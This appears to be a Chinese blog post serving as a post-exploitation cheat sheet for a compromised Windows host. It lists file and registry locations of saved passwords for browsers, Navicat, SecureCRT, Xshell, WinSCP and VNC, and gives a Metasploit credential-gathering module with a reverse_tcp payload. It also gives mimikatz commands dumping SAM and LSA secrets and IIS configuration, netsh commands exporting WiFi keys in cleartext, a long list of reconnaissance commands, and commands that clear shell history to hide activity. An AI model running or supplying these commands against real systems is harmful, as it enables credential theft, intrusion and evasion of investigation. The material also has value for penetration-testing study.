**目录**

[Windows账号密码](#t0 "Windows账号密码")

[浏览器账号密码](#t1 "浏览器账号密码")

[其他软件账号密码](#t2 "其他软件账号密码")

[VPN账号密码](#t3 "VPN账号密码")

[WIFI账号密码](#t4 "WIFI账号密码")

[web服务配置路径](#t5 "web服务配置路径")

[windows 回收站的信息获取](#t6 "windows 回收站的信息获取")

[其他信息收集](#t7 "其他信息收集")

* * *

在获取了Windows系统权限(通常是管理员权限)后，我们就需要尽可能多的收集这台机器上的各种信息，各种密码，各种敏感文件和资料了。如下是收集信息的一些命令：

### Windows账号密码

传送门——> [Windows中获取用户密码](https://xie1997.blog.csdn.net/article/details/104179261 "Windows中获取用户密码")

### RDP登录凭据

传送门——>[获取RDP登录凭据](https://xie1997.blog.csdn.net/article/details/107068706 "获取RDP登录凭据")

### windows登录日志

```
登录成功日志      
wevtutil qe security /q:"*[EventData[Data[@Name='LogonType']='10'] and System[(EventID=4624)]]" /f:text /rd:true /c:10      
登录失败日志      
wevtutil qe security /q:"*[EventData[Data[@Name='LogonType']='10'] and System[(EventID=4625)]]" /f:text /rd:true /c:10
```


传送门： [RDP登录相关](https://xie1997.blog.csdn.net/article/details/111186688 "RDP登录相关")

### 浏览器账号密码

**Google Chrome**

chrome浏览器默认的用户数据保存目录如下：

```
用户数据目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\      
缓存目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\       
各文件如下：      
    书签：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Bookmarks      
    Cookie: C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cookies      
    浏览历史：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\History      
    当前的session：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Current Session      
    账号密码：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Login Data      1
             C:\Users\xx\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data
```


**Firefox**

**IE/Edge**

**QQ浏览器**

QQ浏览器默认的用户数据保存目录如下：

```
用户数据目录：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default      
缓存目录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\       
各文件如下：      
    书签：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Bookmarks      
    Cookie: C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Cookies      
    浏览历史：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\History      
    当前的session：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Current Session      
    账号密码：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Login Data
```


**360安全浏览器**

```
账号密码文件：C:\Users\xx\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis\assis2.db
```


**MSF模块**

```
use post/multi/gather/lastpass_creds      
set payload windows/meterpreter/reverse_tcp      
set lhost 0.0.0.0      
set session 1      
exploit
```


相关文章：[浏览器密码存储原理和渗透中的利用](https://www.secpulse.com/archives/3351.html "浏览器密码存储原理和渗透中的利用")

### 其他软件账号密码

**Navicat：**

<table cellpadding="0" cellspacing="0"><tbody><tr><td style="vertical-align:top;"><p>MySQL</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>MariaDB</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>MongoDB</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>Microsoft &nbsp;SQL</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>Oracle</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>PostgreSQL</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr><tr><td style="vertical-align:top;"><p>SQLite</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt;your &nbsp;connection name&gt;</p></td></tr></tbody></table>

![](https://img-blog.csdnimg.cn/20200804174946182.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**SecureCRT：**

<table cellpadding="0" cellspacing="0"><tbody><tr><td style="vertical-align:top;"><p>xp/win2003</p></td><td style="vertical-align:top;"><p>C:\Documents &nbsp;&nbsp;and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</p><p></p></td></tr><tr><td style="vertical-align:top;"><p>win7/win2008以上</p></td><td style="vertical-align:top;"><p>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</p></td></tr></tbody></table>

**Xshell：**

<table cellpadding="0" cellspacing="0"><tbody><tr><td style="vertical-align:top;"><p>Xshell 5</p></td><td style="vertical-align:top;"><p>%userprofile%\Documents\NetSarang\Xshell\Sessions</p></td></tr><tr><td style="vertical-align:top;"><p>Xshell 6</p></td><td style="vertical-align:top;"><p>%userprofile%\Documents\NetSarang &nbsp;Computer\6\Xshell\Sessions</p></td></tr></tbody></table>

![](https://img-blog.csdnimg.cn/20200827181034140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**WinSCP：**

<table cellpadding="0" cellspacing="0"><tbody><tr><td style="vertical-align:top;"><p>HKCU\Software\Martin &nbsp;Prikryl\WinSCP 2\Sessions</p></td></tr></tbody></table>

**VNC:**

<table cellpadding="0" cellspacing="0"><tbody><tr><td style="vertical-align:top;"><p>RealVNC</p></td><td style="vertical-align:top;"><p>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</p></td><td style="vertical-align:top;"><p>Password</p></td></tr><tr><td style="vertical-align:top;"><p>TightVNC</p></td><td style="vertical-align:top;"><p>HKEY_CURRENT_USER\Software\TightVNC\Server &nbsp;Value</p></td><td style="vertical-align:top;"><p>Password &nbsp;or PasswordViewOnly</p></td></tr><tr><td style="vertical-align:top;"><p>TigerVNC</p></td><td style="vertical-align:top;"><p>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</p></td><td style="vertical-align:top;"><p>Password</p><p></p></td></tr><tr><td style="vertical-align:top;"><p>UltraVNC</p></td><td style="vertical-align:top;"><p>C:\Program &nbsp;Files\UltraVNC\ultravnc.ini</p></td><td style="vertical-align:top;"><p>passwd or &nbsp;passwd2</p></td></tr></tbody></table>

### VPN账号密码

```
mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit
```


也可以使用图形化命令工具 Dialupass.exe

### WIFI账号密码

```
#查看帮助      
netsh wlan help       
#列出无线接口      
netsh wlan show interface       
#开启无线接口      
netsh interface set interface "Interface Name" enabled       1
#显示连接过的WIFI的配置文件      1
netsh wlan show profiles       1
#连接指定wifi      1
netsh wlan connect name=xxxx       1
#断开连接      1
netsh wlan disconnect       2
#查看连接过的WIFI的配置文件(包含账号密码)，需要管理员权限执行      2
netsh wlan export profile interface=WLAN key=clear folder=C:\      2
#然后使用type命令查看配置文件      2
type C:\xxx.xml       2
#批量显示wifi账号密码      2
for /f  "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles')  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear       2
其它常用的命令：      2
    导出配置文件：netsh wlan export profile key=clear      3
    删除配置文件：netsh wlan delete profile name=""      3
    添加配置文件：netsh wlan add profile filename=""
```


![](https://img-blog.csdnimg.cn/20200721103946404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200721104329804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200804181852724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[windows 通过cmd命令（netsh wlan命令）连接wifi](https://www.cnblogs.com/moonbaby/p/11188135.html "windows 通过cmd命令（netsh wlan命令）连接wifi")

### web服务配置路径

**IIS**

```
IIS6：      
cscript.exe C:\Inetpub\AdminScripts\adsutil.vbs ENUM W3SVC/1/root       
IIS7、IIS8：      
列出网站列表：appcmd.exe %systemroot%/system32/inetsrv/appcmd.exe list site      
列出网站物理路径：appcmd.exe %systemroot%\system32\inetsrv\appcmd.exe list vdir       
或者使用mimikatz读取IIS7配置文件：      
mimikatz.exe privilege::debug log "iis::apphost /in:"%systemroot%\system32\inetsrv\config\applicationHost.config" /live" exit
```


**Tomcat**

```
/conf/tomcat-users.xml      
/conf/server.xml      
/conf/web.xml
```


**Apache**

```
/etc/httpd/conf/httpd.conf
```


**Nginx**

```
/etc/nginx/nginx.conf
```


**wdcp**

```
/www/wdlinux/wdcp/conf/mrpw.conf
```


### 其他信息收集

```
系统      
systeminfo                                                #查看系统信息      
net config workstation                                    #简单查看系统信息      
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"      #查看系统及版本，英文系统      
systeminfo | findstr /B /C:"OS 名称" /C:"OS 版本"          #查看系统及版本，中文系统      
echo %PROCESSOR_ARCHITECTURE%                             #查看系统架构，一般为AMD64      
set                                                       #查看系统环境变量      
wmic qfe get Caption,Description,HotFixID,InstalledOn     #查看系统补丁信息      
wmic bios                                                 #查看bios信息      1
nbtstat -A ip                                             #netbios查询      1
fsutil fsinfo drives                                      #查看所有的盘符      1
gpupdate /force                                           #更新计算机策略       1
安装的软件版本信息      1
wmic product get name,version                             #查看安装的软件及版本      1
powershell "get-wmiobject -class Win32_product | select-Object -property name,version"   #查看安装的软件及版本       1
网络      2
ipconfig /all                                             #查看ip详细信息      2
ipconfig /displaydns                                      #查看DNS缓存      2
route print                                               #查看路由      2
arp -a                                                    #查看arp缓存表      2
net view                                                  #查询机器列表      2
type C:\Windows\System32\drivers\etc\hosts                #查看hosts文件       2
用户账号密码      2
whoami /all                                               #查询当前用户权限等      2
net user                                                  #只显示本机的用户，不显示域用户      3
net user xie                                              #查看用户xie的具体信息      3
wmic useraccount get /ALL                                 #查看本机用户详细信息      3
net localgroup                                            #查看组      3
net localgroup administrators                             #显示本机的administrators管理员组。除了显示本机中用户，还会显示域用户(前提是该域用户在本机的Administrators组内)      3
query user 或 quser                                       #查询当前在线用户      3
qwinsta                                                   #查询当前在线用户      3
qwinsta /SERVER:IP                                        #查看远程登录情况      3
query session                                             #查询会话      3
query termserver                                          #查询远程桌面主机列表      3
net accounts                                              #查看本地密码策略       4
端口      4
netstat -ano                                              #查看端口开放情况、      4
netstat -ano|findstr 80                                   #查看80端口对应的PID       4
查看回收站内容      4
SharpCheckInfo.exe -GetRecycle       4
服务      4
net start                                                 #查询当前运行的服务      5
wmic service list brief                                   #查看服务name、进程ID、状态等       5
进程      5
tasklist                                                  #查看进程列表      5
tasklist  /svc                                            #查看进程，显示进程使用者名称      5
tasklist | findstr 80                                     #查看80端口对应的进程      5
taskkill /f /t /im xx.exe                                 #杀死xx.exe进程      5
taskkill /F -pid 520                                      #杀死pid为520的进程      5
wmic process list brief                                   #查看进程       6
共享      6
net use                                                   #查看连接      6
net share                                                 #查看共享      6
wmic share get name,path,status                           #查看共享信息      6
net session                                               #查看会话      6
net view \ip                                              #查询指定IP共享       6
启动程序信息                       6
wmic startup get command,caption                          #查看启动项信息       7
计划任务      7
schtasks /query /fo LIST /v                               #查看计划任务       7
开机时间      7
net statistics workstation                                #查看机器开机时间       7
查询IE浏览器的代理信息      7
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"        7
查询RDP端口号      8
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /V portNumber       8
cmd和powershell的当前窗口历史命令(注，只限于powershellv3以下)      8
Get-History | Format-List -Property *                     # 查询 powershell 当前窗口历史操作记录      8
Clear-History                                             # 删除 powershell 当前窗口历史操作记录      8
Clear-History -Id 3                                       # 删除 powershell 当前窗口指定 ID 的历史操作记录      8
doskey /h                                                 # 查看 cmd 的历史操作记录      8
doskey /reinstall                                         # 删除 cmd 的历史操作记录      8
# powershell v3、v4 版本需要安装Get-PSReadlineOption      8
msiexec /q /i PackageManagement_x64.msi      9
# 查看 powershellv5 历史操作记录      9
type %appdata%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```


 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[后渗透攻防的信息收集 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/51527.html "后渗透攻防的信息收集 - SecPulse.COM | 安全脉搏")

相关文章：[Windows渗透基础大全](https://xie1997.blog.csdn.net/article/details/83068430 "Windows渗透基础大全")